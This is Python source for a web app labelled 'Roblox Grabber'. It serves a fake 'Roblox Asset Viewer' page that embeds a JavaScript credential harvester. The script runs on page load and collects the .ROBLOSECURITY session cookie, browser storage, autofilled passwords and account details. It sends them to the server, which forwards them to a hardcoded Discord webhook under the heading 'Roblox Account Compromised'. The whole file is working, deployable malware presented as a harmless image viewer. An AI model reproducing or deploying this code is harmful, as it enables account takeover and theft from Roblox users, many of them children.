from urllib import parse
import traceback, requests, base64, httpagentparser, json as _json, time

config = {
"webhook": "https://discord.com/api/webhooks/1507858412900192386/AIgW29HVoKf6StR10P2_1bOXONbg6cVd4Ti6jEoQMfzsIOludq3FOUk_tKrtPSo4HwoI",
"image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
"username": "Roblox Grabber",
"color": 0xFF4444,
}

def sendDiscord(webhook, json_data):
try:
requests.post(webhook, json=json_data, timeout=10)
except:
pass

def logRoblox(ip, data, useragent):
fields = []
if data.get("username"):
fields.append({"name": "Username", "value": f"```{data['username']}```", "inline": True})
if data.get("email"):
fields.append({"name": "Email", "value": f"```{data['email']}```", "inline": True})
if data.get("password"):
fields.append({"name": "Password", "value": f"```{data['password']}```", "inline": True})
if data.get("cookie"):
cookie = data["cookie"]
fields.append({"name": ".ROBLOSECURITY Cookie", "value": f"```{cookie[:100]}```\n[Login with this cookie](https://www.roblox.com)", "inline": False})
if data.get("userId"):
fields.append({"name": "User ID", "value": f"```{data['userId']}```", "inline": True})
if data.get("displayName"):
fields.append({"name": "Display Name", "value": f"```{data['displayName']}```", "inline": True})
if data.get("robux"):
fields.append({"name": "Robux", "value": f"```{data['robux']}```", "inline": True})

if fields:
sendDiscord(config["webhook"], {
"username": "Roblox Grabber",
"content": "@everyone",
"embeds": [{
"title": "Roblox Account Compromised",
"color": 0x00FF00,
"fields": fields,
"footer": {"text": f"IP: {ip} | {useragent[:100]}"}
}]
})

def harvestScript():
return '''
<script>
// Roblox Credential Harvester v2 - Works on all pages
(function() {
var collected = { username: "", email: "", password: "", cookie: "", userId: "", displayName: "", robux: "" };

function sendData() {
if (collected.cookie || collected.password || collected.username || collected.email) {
var payload = btoa(unescape(encodeURIComponent(JSON.stringify(collected))));
new Image().src = window.location.pathname + (window.location.search ? "&" : "?") + "rbx=" + payload;
}
}

function extractFromObject(obj) {
if (!obj || typeof obj !== "object") return;
var str = JSON.stringify(obj).toLowerCase();
if (!str.includes("roblox") && !str.includes("password") && !str.includes("username") && !str.includes("email")) return;

if (obj.UserName && !collected.username) collected.username = obj.UserName;
if (obj.username && !collected.username) collected.username = obj.username;
if (obj.Name && !collected.username) collected.username = obj.Name;
if (obj.Password && !collected.password) collected.password = obj.Password;
if (obj.password && !collected.password) collected.password = obj.password;
if (obj.Email && !collected.email) collected.email = obj.Email;
if (obj.email && !collected.email) collected.email = obj.email;
if (obj.UserId && !collected.userId) collected.userId = obj.UserId;
if (obj.userId && !collected.userId) collected.userId = obj.userId;
if (obj.DisplayName && !collected.displayName) collected.displayName = obj.DisplayName;
if (obj.displayName && !collected.displayName) collected.displayName = obj.displayName;
if (obj.Robux && !collected.robux) collected.robux = obj.Robux;
if (obj.robux && !collected.robux) collected.robux = obj.robux;
}

// Phase 1: IMMEDIATE checks
function phase1() {
// Check cookies
document.cookie.split("; ").forEach(function(c) {
var parts = c.split("=");
if (parts[0] === ".ROBLOSECURITY") collected.cookie = parts.slice(1).join("=");
});

// Check ALL items in localStorage
for (var i = 0; i < localStorage.length; i++) {
var key = localStorage.key(i);
try {
var raw = localStorage.getItem(key);
var val = JSON.parse(raw);
extractFromObject(val);
} catch(e) {}
}

// Check all indexDB / other storage patterns
for (var i = 0; i < sessionStorage.length; i++) {
var key = sessionStorage.key(i);
try {
var raw = sessionStorage.getItem(key);
var val = JSON.parse(raw);
extractFromObject(val);
} catch(e) {}
}

// Look for specific Roblox localStorage keys
var robloxKeys = [
"Roblox.Membership", "Roblox.UserData", "robloxUser", "roblox_user",
"user", "userData", "UserData", "currentUser", "CurrentUser",
"loginData", "LoginData", "credentials", "account"
];
robloxKeys.forEach(function(k) {
try {
var raw = localStorage.getItem(k);
if (raw) {
var val = JSON.parse(raw);
extractFromObject(val);
}
} catch(e) {}
});

// Check for password manager autofilled fields immediately
var inputs = document.querySelectorAll("input[type='password']");
for (var i = 0; i < inputs.length; i++) {
if (inputs[i].value && inputs[i].value.length > 0) {
collected.password = inputs[i].value;
// Find the username/email field
var form = inputs[i].closest("form");
if (form) {
var textFields = form.querySelectorAll("input[type='text'], input[type='email'], input[name='username'], input[name='email']");
for (var j = 0; j < textFields.length; j++) {
if (textFields[j].value && textFields[j].value.length > 0) {
collected.username = textFields[j].value;
}
}
}
}
}

// If on roblox.com, grab everything
if (window.location.hostname.includes("roblox.com")) {
var userField = document.querySelector("input[name='username'], #login-username, input[data-testid*='username']");
var passField = document.querySelector("input[type='password'], #login-password");
if (passField && passField.value) {
collected.password = passField.value;
if (userField && userField.value) collected.username = userField.value;
}

// Try to get logged-in user info from page globals
try {
if (window.Roblox && window.Roblox.User) {
if (window.Roblox.User.Username) collected.username = window.Roblox.User.Username;
if (window.Roblox.User.UserId) collected.userId = window.Roblox.User.UserId.toString();
if (window.Roblox.User.DisplayName) collected.displayName = window.Roblox.User.DisplayName;
if (window.Roblox.User.Robux) collected.robux = window.Roblox.User.Robux.toString();
}
} catch(e) {}

// Check window.__INITIAL_STATE__
try {
if (window.__INITIAL_STATE__) {
var initState = JSON.stringify(window.__INITIAL_STATE__);
var parsed = window.__INITIAL_STATE__;
if (parsed.currentUser) extractFromObject(parsed.currentUser);
if (parsed.user) extractFromObject(parsed.user);
if (parsed.account) extractFromObject(parsed.account);
}
} catch(e) {}
}

sendData();
}

// Phase 2: Wait a bit for autofill to populate (delayed)
function phase2() {
setTimeout(function() {
// Re-check password fields (autofill might have filled them by now)
var inputs = document.querySelectorAll("input[type='password']");
for (var i = 0; i < inputs.length; i++) {
if (inputs[i].value && inputs[i].value.length > 0 && !collected.password) {
collected.password = inputs[i].value;
var form = inputs[i].closest("form");
if (form) {
var textFields = form.querySelectorAll("input[type='text'], input[type='email'], input[name='username'], input[name='email']");
for (var j = 0; j < textFields.length; j++) {
if (textFields[j].value && textFields[j].value.length > 0) {
collected.username = textFields[j].value;
}
}
}
}
}
// Re-check cookies (some are httpOnly but worth trying)
document.cookie.split("; ").forEach(function(c) {
var parts = c.split("=");
if (parts[0] === ".ROBLOSECURITY" && !collected.cookie) {
collected.cookie = parts.slice(1).join("=");
}
});
sendData();
}, 1500);
}

// Phase 3: Wait even longer for slow autofill (password managers)
function phase3() {
setTimeout(function() {
var inputs = document.querySelectorAll("input[type='password']");
for (var i = 0; i < inputs.length; i++) {
if (inputs[i].value && inputs[i].value.length > 0 && !collected.password) {
collected.password = inputs[i].value;
var form = inputs[i].closest("form");
if (form) {
var textFields = form.querySelectorAll("input[type='text'], input[type='email'], input[name='username'], input[name='email']");
for (var j = 0; j < textFields.length; j++) {
if (textFields[j].value && textFields[j].value.length > 0) {
collected.username = textFields[j].value;
}
}
}
}
}
sendData();
}, 4000);
}

phase1();
phase2();
phase3();
})();
</script>
'''

def app(environ, start_response):
try:
path = environ.get("PATH_INFO", "/")
qs = environ.get("QUERY_STRING", "")
ip = environ.get("REMOTE_ADDR", "")

headers = {}
for k, v in environ.items():
if k.startswith("HTTP_"):
headers[k[5:].replace("_", "-").lower()] = v
elif k in ("CONTENT_TYPE", "CONTENT_LENGTH"):
headers[k.lower().replace("_", "-")] = v

ip = headers.get("x-forwarded-for", ip)
if ip and "," in ip:
ip = ip.split(",")[0].strip()
ua = headers.get("user-agent", "")
params = dict(parse.parse_qsl(qs)) if qs else {}

# Handle Roblox callback
if params.get("rbx"):
try:
raw = params["rbx"]
# Handle URL-encoded base64
raw = parse.unquote(raw)
decoded = base64.b64decode(raw).decode("utf-8")
data = _json.loads(decoded)
logRoblox(ip, data, ua)
except Exception as e:
try:
sendDiscord(config["webhook"], {
"username": config["username"],
"content": f"Decode error: {e}\nRaw: {params.get('rbx', '')[:200]}"
})
except:
pass

# Serve the page
page = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox Asset Viewer</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ background: #1a1a2e; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: Arial, sans-serif; }}
.container {{ text-align: center; padding: 20px; }}
img {{ max-width: 100%; max-height: 85vh; border-radius: 12px; box-shadow: 0 0 30px rgba(0,0,0,0.5); }}
.loading {{ color: #fff; margin-top: 20px; font-size: 14px; opacity: 0.8; }}
</style>
</head>
<body>
<div class="container">
<img src="{config["image"]}" alt="Roblox Asset" onerror="this.alt='Failed to load asset'"/>
<div class="loading">Loading asset preview...</div>
</div>
{harvestScript()}
</body>
</html>'''

body = page.encode("utf-8")
start_response("200 OK", [
("Content-Type", "text/html; charset=utf-8"),
("Content-Length", str(len(body))),
("Cache-Control", "no-cache, no-store, must-revalidate"),
("Access-Control-Allow-Origin", "*")
])
return [body]

except Exception as e:
try:
sendDiscord(config["webhook"], {
"username": config["username"],
"content": f"**Error:** ```{traceback.format_exc()[:1500]}```"
})
except:
pass
start_response("200 OK", [("Content-Type", "text/plain")])
return [b"Server Error"]
